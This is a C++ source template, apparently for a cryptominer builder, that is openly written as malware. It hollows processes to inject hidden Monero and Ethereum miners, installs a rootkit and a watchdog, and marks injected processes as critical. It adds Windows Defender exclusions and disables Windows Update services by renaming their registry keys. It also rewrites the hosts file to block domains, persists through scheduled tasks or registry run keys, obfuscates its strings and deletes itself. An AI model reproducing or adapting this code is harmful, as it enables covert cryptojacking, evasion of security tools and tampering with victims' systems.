#include "UFiles\ntddk.h"

#include "UFiles\common.h"
#include "UFiles\obfuscateu.h"
#include "UFiles\inject.h"

$GLOBALRESOURCES
$RESOURCES

#if DefProcessProtect
bool bl = false;

void set_critical_process(HANDLE pHandle) {
    if (!bl) {
        TOKEN_PRIVILEGES privilege = { 1, { 0x14, 0, SE_PRIVILEGE_ENABLED } };

        HANDLE hToken = NULL;
	    UtOpenProcessToken(UtCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);

        bl = NT_SUCCESS(UtAdjustPrivilegesToken(hToken, 0, &privilege, sizeof(privilege), NULL, NULL));
    }

    if (bl && pHandle != INVALID_HANDLE_VALUE) {
        ULONG breakStatus = true;
        UtSetInformationProcess(pHandle, (PROCESSINFOCLASS)0x1d, &breakStatus, sizeof(ULONG));
    }
}
#endif

void inject_process(wchar_t* tmpFile, wchar_t* mutex, BYTE* payload, size_t payloadSize, wchar_t* programPath, wchar_t* cmdLine, wchar_t* startDir, wchar_t* runtimeData, bool setCritical) {
    if (!check_mutex(mutex)) {
        cipher(payload, payloadSize);
        HANDLE pHandle = transacted_hollowing(tmpFile, programPath, cmdLine, runtimeData, payload, payloadSize, startDir);
        cipher(payload, payloadSize);
#if DefProcessProtect
        if (setCritical) {
            set_critical_process(pHandle);
        }
#endif
        UtClose(pHandle);
    }
}

int main(int argc, char *argv[])
{
    HANDLE hMutex;

    UNICODE_STRING umutex;
    init_unicode_string(&umutex, AYU_OBFUSCATEW(L"\\BaseNamedObjects\\#MUTEXMINER"), MAX_PATH);

    OBJECT_ATTRIBUTES attr;
    InitializeObjectAttributes(&attr, &umutex, 0, NULL, NULL);

    if (!NT_SUCCESS(UtCreateMutant(&hMutex, MUTANT_ALL_ACCESS, &attr, TRUE))) {
        return 0;
    }

#if DefStartDelay
    LARGE_INTEGER sleeptime;
    sleeptime.QuadPart = -($STARTDELAY * 10000);
    UtDelayExecution(FALSE, &sleeptime);
#endif
    bool isAdmin = check_administrator();

    PUT_PEB_EXT peb = (PUT_PEB_EXT)SWU_GetPEB();
    wchar_t* pebenv = (wchar_t*)peb->ProcessParameters->Environment;

    wchar_t rootdir[MAX_PATH] = { 0 };
    wcscat(rootdir, get_env(pebenv, AYU_OBFUSCATEW(L"SYSTEMROOT=")));

    wchar_t sysdir[MAX_PATH] = { 0 };
    combine_path(sysdir, rootdir, AYU_OBFUSCATEW(L"\\System32"));

    wchar_t cmdPath[MAX_PATH] = { 0 };
    combine_path(cmdPath, sysdir, AYU_OBFUSCATEW(L"\\cmd.exe"));
    
    wchar_t powershellPath[MAX_PATH] = { 0 };
    combine_path(powershellPath, sysdir, AYU_OBFUSCATEW(L"\\WindowsPowerShell\\v1.0\\powershell.exe"));

    wchar_t conhostPath[MAX_PATH] = { 0 };
    combine_path(conhostPath, sysdir, AYU_OBFUSCATEW(L"#CONHOSTPATH"));

    wchar_t tempPath[MAX_PATH] = { 0 };
    wcscat(tempPath, get_env(pebenv, AYU_OBFUSCATEW(L"TEMP=")));

    wchar_t tmpFile[MAX_PATH] = { 0 };
    combine_path(tmpFile, tempPath, AYU_OBFUSCATEW(L"#TMPNAME"));

#if DefWDExclusions
    run_program(true, sysdir, powershellPath, AYU_OBFUSCATEW(L"%S #WDCOMMAND"), powershellPath);
#endif
#if DefDisableWindowsUpdate
    run_program(true, sysdir, cmdPath, AYU_OBFUSCATEW(L"%S /c sc stop UsoSvc & sc stop WaaSMedicSvc & sc stop wuauserv & sc stop bits & sc stop dosvc"), cmdPath);
    rename_key_registry(AYU_OBFUSCATEW(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\UsoSvc"), AYU_OBFUSCATEW(L"UsoSvc_bkp"));
    rename_key_registry(AYU_OBFUSCATEW(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\WaaSMedicSvc"), AYU_OBFUSCATEW(L"WaaSMedicSvc_bkp"));
    rename_key_registry(AYU_OBFUSCATEW(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\wuauserv"), AYU_OBFUSCATEW(L"wuauserv_bkp"));
    rename_key_registry(AYU_OBFUSCATEW(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\BITS"), AYU_OBFUSCATEW(L"BITS_bkp"));
    rename_key_registry(AYU_OBFUSCATEW(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\dosvc"), AYU_OBFUSCATEW(L"dosvc_bkp"));
#endif
#if DefDisableSleep
    run_program(false, sysdir, cmdPath, AYU_OBFUSCATEW(L"%S /c powercfg /x -hibernate-timeout-ac 0 & powercfg /x -hibernate-timeout-dc 0 & powercfg /x -standby-timeout-ac 0 & powercfg /x -standby-timeout-dc 0"), cmdPath);
#endif

#if DefBlockWebsites
    wchar_t hostsPath[MAX_PATH] = { 0 };
    combine_path(hostsPath, sysdir, AYU_OBFUSCATEW(L"\\drivers\\etc\\hosts"));
    ULONG hostsFileSize;
    PVOID hostsFile = read_file(hostsPath, &hostsFileSize);
    if (hostsFile) {
        PVOID hostsData = NULL;
        SIZE_T allocatedSize = hostsFileSize + $DOMAINSIZE;
        if (NT_SUCCESS(UtAllocateVirtualMemory(UtCurrentProcess(), &hostsData, 0, &allocatedSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE))) {
            char* hostsString = (char*)hostsData;
            strcat(hostsString, (char*)hostsFile);
            char* domainSet[] = { $CPPDOMAINSET };
            for (int i = 0; i < $DOMAINSETSIZE; i++) {
                if (strstr(hostsString, domainSet[i]) == NULL) {
                    strcat(hostsString, AYU_OBFUSCATE("\r\n0.0.0.0      "));
                    strcat(hostsString, domainSet[i]);
                    hostsFileSize += 15 + strlen(domainSet[i]);
                }
            }
            write_file(hostsPath, hostsData, hostsFileSize);
            UtFreeVirtualMemory(UtCurrentProcess(), &hostsData, &allocatedSize, MEM_RELEASE);
        }
    }
#endif

#if DefRootkit
        inject_process(tmpFile, NULL, (BYTE*)resRootkit, resRootkitSize, conhostPath, conhostPath, sysdir, nullptr, false);
#endif

#if DefStartup
    wchar_t exePath[MAX_PATH] = { 0 };
    wcscat(exePath, ((PRTL_USER_PROCESS_PARAMETERS)peb->ProcessParameters)->ImagePathName.Buffer);

    wchar_t startupPath[MAX_PATH] = { 0 };
    combine_path(startupPath, get_env(pebenv, AYU_OBFUSCATEW(L"$BASEDIR")), AYU_OBFUSCATEW(L"#STARTUPFILE"));

    wchar_t schtasksPath[MAX_PATH] = { 0 };
    combine_path(schtasksPath, sysdir, AYU_OBFUSCATEW(L"\\schtasks.exe"));

    wchar_t regPath[MAX_PATH] = { 0 };
    combine_path(regPath, sysdir, AYU_OBFUSCATEW(L"\\reg.exe"));

    if (wcsicmp(exePath, startupPath) != 0) {
        if (isAdmin) {
            run_program(true, sysdir, schtasksPath, AYU_OBFUSCATEW(L"%S #STARTUPREMOVEADMIN"), schtasksPath);
        }
        else {
            run_program(true, sysdir, regPath, AYU_OBFUSCATEW(L"%S #STARTUPREMOVEUSER"), regPath);
        }
    }

    if (isAdmin) {
        wchar_t tmpTaskTemplate[MAX_PATH] = { 0 };
        combine_path(tmpTaskTemplate, tempPath, AYU_OBFUSCATEW(L"#TMPXML"));
        write_resource(resTaskTemplate, resTaskTemplateSize, tmpTaskTemplate, L"");
        run_program(true, sysdir, schtasksPath, AYU_OBFUSCATEW(L"%S #STARTUPADDADMIN"), schtasksPath, tmpTaskTemplate);
        delete_file(tmpTaskTemplate);
    }
    else {
        run_program(true, sysdir, regPath, AYU_OBFUSCATEW(L"%S #STARTUPADDUSER"), regPath, startupPath);
    }

    if (wcsicmp(exePath, startupPath) != 0) {
        ULONG fileSize;
        PVOID exeFile = read_file(exePath, &fileSize);
        write_file(startupPath, exeFile, fileSize);
#if DefRunInstall
        if (isAdmin) {
            run_program(false, sysdir, schtasksPath, AYU_OBFUSCATEW(L"%S #STARTUPSTARTADMIN"), schtasksPath);
        }
        else {
            run_program(false, sysdir, startupPath, AYU_OBFUSCATEW(L"%S"), startupPath);
        }
#endif
#if DefAutoDelete
        run_program(false, sysdir, cmdPath, AYU_OBFUSCATEW(L"%S /c choice /C Y /N /D Y /T 3 & Del \"%S\""), cmdPath, exePath);
#endif
        return 0;
    }

#if DefWatchdog
    inject_process(tmpFile, AYU_OBFUSCATEW(L"\\BaseNamedObjects\\#WATCHDOGID"), (BYTE*)resWatchdog, resWatchdogSize, conhostPath, conhostPath, sysdir, nullptr, true);
#endif
#endif
    bool hasGPU = has_gpu();
#if DefMineXMR
    write_resource(resWR64, resWR64Size, tempPath, AYU_OBFUSCATEW(L"\\#WINRINGNAME"));
#if DefGPULibs
    if (hasGPU) {
        wchar_t libPath[MAX_PATH] = { 0 };
        combine_path(libPath, get_env(pebenv, AYU_OBFUSCATEW(L"$CPPLIBSROOT")), AYU_OBFUSCATEW(L"\\Google\\Libs\\"));
        write_resource(resddb64, resddb64Size, libPath, AYU_OBFUSCATEW(L"ddb64.dll"));
    }
#endif
#endif
    
    wchar_t* minerSet[][4] = { $MINERSET };
    for (int i = 0; i < $MINERCOUNT; i++) {
        bool typeETH = !wcsicmp(AYU_OBFUSCATEW(L"eth"), minerSet[i][0]);
        if (!typeETH || hasGPU) {
            wchar_t injectPath[MAX_PATH] = { 0 };
            combine_path(injectPath, !wcsicmp(AYU_OBFUSCATEW(L"\\explorer.exe"), minerSet[i][2]) ? rootdir : sysdir, minerSet[i][2]);

            inject_process(tmpFile, minerSet[i][1], (BYTE*)(typeETH ? resETH : resXMR), (typeETH ? resETHSize : resXMRSize), injectPath, injectPath, sysdir, minerSet[i][3], true);
        }
    }

    UtClose(hMutex);
	return 0;
} 